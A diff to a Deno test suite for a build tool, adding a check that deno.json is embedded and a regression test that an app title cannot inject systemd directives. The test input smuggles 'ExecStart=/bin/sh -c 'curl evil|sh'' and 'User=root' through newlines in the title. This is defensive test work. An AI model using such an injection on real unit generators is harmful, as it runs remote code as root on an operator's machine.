@@ -502,6 +502,10 @@ Deno.test("assetIncludes: auto-discovers .wasm, honors compile.include, skips de
       !files.some((f) => f.includes("..")),
       "no path traversal out of project",
     );
+    // The app's identity travels with the binary: without deno.json
+    // embedded, a compiled app can only guess its own version — and reading the
+    // launch directory's deno.json makes it adopt an unrelated project's.
+    assert(files.includes("deno.json"), "deno.json embedded");
   } finally {
     await Deno.remove(dir, { recursive: true });
   }
@@ -823,5 +827,47 @@ Deno.test("proto: mismatch reason names which side is old and its version", () =
   assertEquals(unknown.ok, false);
   if (!unknown.ok) {
     assertStringIncludes(unknown.reason, "an unknown aio version");
+  }
+});
+
+// systemd units are line-oriented, so a newline in `deno.json`'s title
+// starts a new DIRECTIVE. A title of "My App\nExecStart=…\nUser=root" produced
+// a unit that ran something else as root on the machine the operator installs
+// it on. `binaryName` was already slugified; `appTitle` is free text.
+Deno.test("writeServiceFile: a title cannot inject systemd directives", async () => {
+  const { writeServiceFile } = await import("../src/build/build-compile.ts");
+  const dir = await Deno.makeTempDir({ prefix: "aio-unit-" });
+  const cwd = Deno.cwd();
+  try {
+    Deno.chdir(dir);
+    await writeServiceFile(
+      {
+        binaryName: "myapp",
+        appTitle:
+          "Evil\nExecStart=/bin/sh -c 'curl evil|sh'\nUser=root\n[Service]",
+        doRemote: false,
+        doHeadless: true,
+        // deno-lint-ignore no-explicit-any
+      } as any,
+    );
+    const unit = await Deno.readTextFile(`${dir}/myapp.service`);
+    const directives = unit.split("\n").filter((l) => /^ExecStart=/.test(l));
+    assertEquals(
+      directives.length,
+      1,
+      `exactly one ExecStart must exist:\n${unit}`,
+    );
+    assert(
+      directives[0]!.includes("/usr/local/bin/myapp"),
+      "and it must be the real binary",
+    );
+    assert(!/^User=root$/m.test(unit), `no injected User= line:\n${unit}`);
+    assert(
+      unit.includes("Description=Evil ExecStart="),
+      `the title survives, flattened onto one line:\n${unit}`,
+    );
+  } finally {
+    Deno.chdir(cwd);
+    await Deno.remove(dir, { recursive: true }).catch(() => {});
   }
 });
